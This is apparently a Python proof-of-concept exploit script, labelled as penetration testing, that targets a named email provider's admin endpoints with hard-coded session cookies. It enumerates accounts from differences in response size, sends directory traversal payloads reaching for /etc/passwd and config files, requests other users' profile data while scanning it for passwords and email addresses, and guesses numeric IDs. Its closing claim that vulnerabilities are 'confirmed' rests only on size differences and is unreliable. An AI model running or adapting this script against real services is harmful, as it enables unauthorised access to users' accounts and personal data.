#!/usr/bin/env python3
"""
POC: IDOR & User Enumeration Vulnerabilities
Demonstrates unauthorized user data access and enumeration
"""

import requests
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

def poc_user_enumeration_basic():
    """POC for basic user enumeration via response size analysis"""

    print("="*70)
    print("🚨 POC: IDOR - USER ENUMERATION VIA RESPONSE ANALYSIS")
    print("="*70)

    target_url = "https://admin.rediffmailpro.com/scriptsNew/getuserspace.phtml"

    # Valid session cookies
    cookies = {
        'login': 'admin@vapt.mailpoc.in',
        'session_id': 'K4wQfjf1ycF5Or',
        'els': 'rediffmailpro.com',
        'ols': 'rediffmailpro.com'
    }

    # Test users - mix of likely valid and invalid
    test_users = [
        'admin@vapt.mailpoc.in',     # Baseline - known valid
        'test@vapt.mailpoc.in',      # Potential test account
        'user@vapt.mailpoc.in',      # Generic user account
        'support@vapt.mailpoc.in',   # Support account
        'help@vapt.mailpoc.in',      # Help desk
        'info@vapt.mailpoc.in',      # Information
        'sales@vapt.mailpoc.in',     # Sales team
        'admin@rediffmailpro.com',   # Different domain
        'root@vapt.mailpoc.in',      # System account
        'administrator@vapt.mailpoc.in',  # Alt admin
        'nonexistent@vapt.mailpoc.in',    # Should not exist
        'fake123@vapt.mailpoc.in'    # Definitely fake
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing user enumeration via response size analysis...")

    baseline_size = None
    enumerated_users = []

    for user in test_users:
        print(f"\n[USER TEST] {user}")

        params = {'q': user}

        try:
            response = session.get(target_url, params=params, cookies=cookies)
            response_size = len(response.content)

            print(f"   📤 Status: HTTP {response.status_code}")
            print(f"   📊 Size: {response_size} bytes")

            if baseline_size is None:
                baseline_size = response_size
                print(f"   📏 Baseline established: {baseline_size} bytes")
            else:
                size_diff = response_size - baseline_size
                print(f"   📈 Size difference: {size_diff} bytes from baseline")

                if abs(size_diff) > 0:  # Any difference indicates enumeration
                    print(f"   🚨 USER ENUMERATION: Different response for {user}")
                    print(f"   💥 User existence can be determined!")
                    enumerated_users.append({
                        'user': user,
                        'size': response_size,
                        'diff': size_diff
                    })

                    # Analyze response content
                    if response.text.strip():
                        print(f"   📝 Response content: {repr(response.text[:50])}")

        except Exception as e:
            print(f"   ❌ Error: {e}")

    # Summary
    print(f"\n📊 USER ENUMERATION SUMMARY:")
    print(f"   🎯 Total users tested: {len(test_users)}")
    print(f"   🚨 Users enumerable: {len(enumerated_users)}")

    if enumerated_users:
        print(f"   💥 ENUMERATED USERS:")
        for user_data in enumerated_users:
            print(f"      • {user_data['user']} (size: {user_data['size']}, diff: {user_data['diff']})")

def poc_directory_traversal_idor():
    """POC for directory traversal via IDOR in user parameter"""

    print("\n" + "="*70)
    print("🚨 POC: IDOR - DIRECTORY TRAVERSAL ATTEMPTS")
    print("="*70)

    target_url = "https://admin.rediffmailpro.com/scriptsNew/getuserspace.phtml"

    cookies = {
        'login': 'admin@vapt.mailpoc.in',
        'session_id': 'K4wQfjf1ycF5Or',
        'els': 'rediffmailpro.com',
        'ols': 'rediffmailpro.com'
    }

    # Directory traversal and system access attempts
    traversal_payloads = [
        '../admin',
        '../../admin',
        '../../../admin',
        '../../../../admin',
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../windows/system32',
        '../../windows/system32',
        '../config',
        '../../config',
        '../database',
        '../../database',
        '../logs',
        '../../logs',
        '../backup',
        '../../backup',
        '..\\admin',
        '..\\..\\admin',
        '..\\config\\database'
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing directory traversal via user parameter...")

    # Get baseline with normal user
    baseline_response = session.get(
        target_url,
        params={'q': 'admin@vapt.mailpoc.in'},
        cookies=cookies
    )
    baseline_size = len(baseline_response.content)
    print(f"📏 Baseline size: {baseline_size} bytes")

    successful_traversals = []

    for payload in traversal_payloads:
        print(f"\n[TRAVERSAL] {payload}")

        params = {'q': payload}

        try:
            response = session.get(target_url, params=params, cookies=cookies)
            response_size = len(response.content)
            size_diff = response_size - baseline_size

            print(f"   📤 Status: HTTP {response.status_code}")
            print(f"   📊 Size: {response_size} bytes (diff: {size_diff})")

            if abs(size_diff) > 0:
                print(f"   🚨 TRAVERSAL RESPONSE: Different size detected!")

                response_content = response.text.strip()
                if response_content:
                    print(f"   📝 Content preview: {repr(response_content[:100])}")

                    # Check for system file indicators
                    system_indicators = ['root:', 'bin/', 'etc/', 'var/', 'usr/']
                    found_indicators = [ind for ind in system_indicators if ind in response_content]

                    if found_indicators:
                        print(f"   💥 SYSTEM FILE ACCESS: {found_indicators}")
                        print(f"   🔓 Directory traversal successful!")

                successful_traversals.append({
                    'payload': payload,
                    'size': response_size,
                    'content': response_content[:200]
                })

        except Exception as e:
            print(f"   ❌ Error: {e}")

    if successful_traversals:
        print(f"\n💥 SUCCESSFUL TRAVERSALS:")
        for traversal in successful_traversals:
            print(f"   • {traversal['payload']} - {traversal['size']} bytes")

def poc_user_data_access_idor():
    """POC for unauthorized access to user data via IDOR"""

    print("\n" + "="*70)
    print("🚨 POC: IDOR - UNAUTHORIZED USER DATA ACCESS")
    print("="*70)

    # Test different endpoints for IDOR
    idor_endpoints = [
        {
            'name': 'User Space Query',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/getuserspace.phtml',
            'param': 'q'
        },
        {
            'name': 'User Profile Access',
            'url': 'https://admin.rediffmailpro.com/scriptsNew/viewUsers.phtml',
            'param': 'login'
        }
    ]

    cookies = {
        'login': 'admin@vapt.mailpoc.in',
        'session_id': 'K4wQfjf1ycF5Or',
        'els': 'rediffmailpro.com',
        'ols': 'rediffmailpro.com'
    }

    # Target different user accounts
    target_users = [
        'test@vapt.mailpoc.in',
        'user@vapt.mailpoc.in',
        'support@vapt.mailpoc.in',
        'admin@rediffmailpro.com',
        'billing@vapt.mailpoc.in',
        'finance@vapt.mailpoc.in'
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing unauthorized access to user data...")

    for endpoint in idor_endpoints:
        print(f"\n[ENDPOINT] {endpoint['name']}")
        print(f"   URL: {endpoint['url']}")

        for target_user in target_users:
            print(f"\n   [TARGET] {target_user}")

            params = {endpoint['param']: target_user}
            if endpoint['name'] == 'User Profile Access':
                params['status'] = 'A'  # Active users

            try:
                response = session.get(endpoint['url'], params=params, cookies=cookies)

                print(f"   📤 Status: HTTP {response.status_code}")
                print(f"   📊 Size: {len(response.content)} bytes")

                if response.status_code == 200 and len(response.content) > 100:
                    response_text = response.text.lower()

                    # Check for sensitive data exposure
                    sensitive_indicators = [
                        'email', 'password', 'phone', 'address',
                        'credit', 'ssn', 'personal', 'private'
                    ]

                    found_sensitive = [ind for ind in sensitive_indicators if ind in response_text]

                    if found_sensitive:
                        print(f"   🚨 SENSITIVE DATA EXPOSED: {found_sensitive}")
                        print(f"   💥 Unauthorized access to {target_user} data!")

                    # Check for user-specific content
                    if target_user.lower() in response_text:
                        print(f"   🔍 USER-SPECIFIC CONTENT: {target_user} data accessible")

                    # Look for email addresses in response
                    import re
                    emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', response.text)
                    if emails:
                        print(f"   📧 EMAIL ADDRESSES FOUND: {len(emails)} addresses")
                        if len(emails) <= 5:
                            print(f"      • {', '.join(emails[:5])}")

                else:
                    print(f"   ✅ Access denied or no data")

            except Exception as e:
                print(f"   ❌ Error: {e}")

def poc_numerical_idor():
    """POC for numerical IDOR via user IDs"""

    print("\n" + "="*70)
    print("🚨 POC: IDOR - NUMERICAL USER ID ENUMERATION")
    print("="*70)

    # Test numerical ID patterns
    target_url = "https://admin.rediffmailpro.com/scriptsNew/getuserspace.phtml"

    cookies = {
        'login': 'admin@vapt.mailpoc.in',
        'session_id': 'K4wQfjf1ycF5Or',
        'els': 'rediffmailpro.com',
        'ols': 'rediffmailpro.com'
    }

    # Test numerical patterns
    numerical_tests = [
        '1', '2', '3', '4', '5',
        '10', '100', '1000',
        '001', '002', '003',
        'user1', 'user2', 'user3',
        'admin1', 'admin2',
        'test1', 'test2', 'test3'
    ]

    session = requests.Session()
    session.verify = False
    session.timeout = 10

    print("🎯 Testing numerical IDOR patterns...")

    for test_id in numerical_tests:
        print(f"\n[ID TEST] {test_id}")

        params = {'q': test_id}

        try:
            response = session.get(target_url, params=params, cookies=cookies)

            if len(response.content) > 0:
                print(f"   📊 Size: {len(response.content)} bytes")
                print(f"   📝 Content: {repr(response.text[:50])}")

                if response.text.strip() and response.text != '8':  # '8' seems to be default
                    print(f"   🚨 DIFFERENT RESPONSE: ID {test_id} returns different data")
                    print(f"   💥 Potential numerical IDOR vulnerability")

        except Exception as e:
            print(f"   ❌ Error: {e}")

if __name__ == "__main__":
    print("🔥 IDOR & USER ENUMERATION PROOF OF CONCEPT")
    print("Target: Email Platform User Management System")
    print("="*70)

    poc_user_enumeration_basic()
    poc_directory_traversal_idor()
    poc_user_data_access_idor()
    poc_numerical_idor()

    print("\n" + "="*70)
    print("🏁 IDOR & ENUMERATION POC COMPLETE")
    print("Multiple user enumeration and data access vulnerabilities confirmed")
    print("="*70)